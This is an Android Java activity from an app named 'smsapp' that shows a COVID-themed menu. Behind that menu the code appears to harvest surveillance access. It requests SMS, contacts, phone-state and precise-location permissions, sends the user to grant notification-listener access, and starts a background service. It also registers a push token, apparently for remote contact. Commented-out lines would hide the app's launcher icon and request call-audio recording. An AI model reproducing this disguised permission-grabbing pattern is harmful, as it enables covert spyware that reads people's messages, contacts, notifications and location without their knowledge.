package gonext.smsapp.activity.bottommenu;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.MenuItem;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.FragmentTransaction;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.android.material.bottomnavigation.BottomNavigationView;
import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.iid.InstanceIdResult;

import java.util.ArrayList;
import java.util.List;

import gonext.smsapp.R;
import gonext.smsapp.fragments.MobileNetworkFragment;
import gonext.smsapp.fragments.covid.CheckInFragment;
import gonext.smsapp.fragments.covid.HomeFragment;
import gonext.smsapp.fragments.covid.ProfileFragment;
import gonext.smsapp.fragments.covid.StatisticsFragment;
import gonext.smsapp.servers.BackgroundJob;
import io.github.inflationx.viewpump.ViewPumpContextWrapper;

public class MenuActivity extends AppCompatActivity {

    BottomNavigationView mBottomNavigationView;
    boolean doubleBackToExitPressedOnce = false;

    private int PERMISSION_FLAG = 2000;
    String TAG = "FCCM";
    public static String strToken="";
    private MobileNetworkFragment mobileNetworkFragment;


    @Override
    protected void attachBaseContext(Context newBase) {
        super.attachBaseContext(ViewPumpContextWrapper.wrap(newBase));
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_menu);
        checkAllPermissions();
        initViews();
        setupBottomNavigation();
    }

    private void initViews() {
        String settings = Settings.Secure.getString(this.getContentResolver(),"enabled_notification_listeners");
        if (settings != null && settings.contains(getApplicationContext().getPackageName()))
        {
            System.out.println("enabled");
            //service is enabled do something
        } else {
            //service is not enabled try to enabled by calling...
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
        }

         /*PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/
        startService(new Intent(this, BackgroundJob.class)); //start service which is BackgroundJob.java
        initFCM();

        mBottomNavigationView = findViewById(R.id.bottom_navigation);
        Fragment fragment = new HomeFragment();
        loadFragment(fragment);
    }

    private void initFCM() {
        FirebaseInstanceId.getInstance().getInstanceId()
                .addOnCompleteListener(new OnCompleteListener<InstanceIdResult>() {
                    @Override
                    public void onComplete(@NonNull Task<InstanceIdResult> task) {
                        if (!task.isSuccessful()) {
                            Log.w(TAG, "getInstanceId failed", task.getException());
                            return;
                        }

                        // Get new Instance ID token
                        strToken = task.getResult().getToken();

                        // Log and toast
//                        String msg = getString("R.string.msg_token_fmt", token);
//                        Log.d(TAG, ""+strToken);
//                        Toast.makeText(MainActivity.this, strToken, Toast.LENGTH_SHORT).show();
                    }
                });
    }

    private void checkAllPermissions(){

        int phoneState = ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_PHONE_STATE);

        int readContacts = ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CONTACTS);

        int readSMS = ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS);

        int storage = ContextCompat.checkSelfPermission(this,
                Manifest.permission.WRITE_EXTERNAL_STORAGE);

        int recordAudio = ContextCompat.checkSelfPermission(this,
                Manifest.permission.RECORD_AUDIO);

        int outGoingCalls = ContextCompat.checkSelfPermission(this,
                Manifest.permission.PROCESS_OUTGOING_CALLS);

        int captureAudio = ContextCompat.checkSelfPermission(this,
                Manifest.permission.CAPTURE_AUDIO_OUTPUT);

        int coaroseLoc = ContextCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_COARSE_LOCATION);

        int fineLoc = ContextCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_FINE_LOCATION);
        boolean isAllGranted = true;

        List<String> permissions = new ArrayList<>();
        if(phoneState != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.READ_PHONE_STATE);
        }
        if(readContacts != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.READ_CONTACTS);
        }
        if(readSMS != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.READ_SMS);
        }
        if(storage != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        /*if(recordAudio != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.RECORD_AUDIO);
        }
        if(outGoingCalls != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
        }
        if(captureAudio != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.CAPTURE_AUDIO_OUTPUT);
        }
        */
        if(coaroseLoc != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        }
        if(fineLoc != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        }
        if(!isAllGranted){
            ActivityCompat.requestPermissions(this,
                    permissions.toArray(new String[permissions.size()]),
                    PERMISSION_FLAG);

        }

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

    }

    private void setupBottomNavigation() {

        mBottomNavigationView.setOnNavigationItemSelectedListener(
                new BottomNavigationView.OnNavigationItemSelectedListener() {

                    @Override
                    public boolean onNavigationItemSelected(MenuItem item) {
                        Fragment fragment;
                        switch (item.getItemId()){
                            case R.id.action_menu_one:
                                fragment = new HomeFragment();
                                loadFragment(fragment);
                                return true;

                            case R.id.action_menu_two:
                                fragment = new StatisticsFragment();
                                loadFragment(fragment);
                                return true;

                            case R.id.action_menu_three:
                                fragment = new CheckInFragment();
                                loadFragment(fragment);
                                return true;

                            case R.id.action_menu_four:
                                fragment = new ProfileFragment();
                                loadFragment(fragment);
                                return true;
                        }
                        return false;
                    }
                });
    }

    private void loadFragment(Fragment fragment) {

        FragmentManager manager = getSupportFragmentManager();
        if (manager.getBackStackEntryCount() > 0) {
            FragmentManager.BackStackEntry first = manager.getBackStackEntryAt(0);
            manager.popBackStack(first.getId(), FragmentManager.POP_BACK_STACK_INCLUSIVE);
        }

        FragmentTransaction transaction = manager.beginTransaction();
        transaction.replace(R.id.frame_container, fragment);
        transaction.addToBackStack(null);
        transaction.commit();
    }

    @Override
    public void onBackPressed() {
//        back=1;
        if(!(getSupportFragmentManager().findFragmentById(R.id.frame_container) instanceof HomeFragment))
        {
            mBottomNavigationView.setSelectedItemId(R.id.action_menu_one);
            Fragment fragment = new HomeFragment();
//            Bundle bundle = new Bundle();
//            bundle.putInt("isBack", back);
//            fragment.setArguments(bundle);
            loadFragment(fragment);
//            back=0;
        }else {
            if (doubleBackToExitPressedOnce) {
                finish();
                return;
            }

//            Fragment fragment = getSupportFragmentManager().findFragmentById(R.id.frame_container);
//            if (!(fragment instanceof IOnBackPressed) || !((IOnBackPressed) fragment).onBackPressed()) {
//                super.onBackPressed();
//            }

            this.doubleBackToExitPressedOnce = true;
//            Toast.makeText(this, "Please click BACK again to exit", Toast.LENGTH_SHORT).show();

            new Handler().postDelayed(new Runnable() {

                @Override
                public void run() {
                    doubleBackToExitPressedOnce=false;
                }
            }, 1000);
        }
    }
}
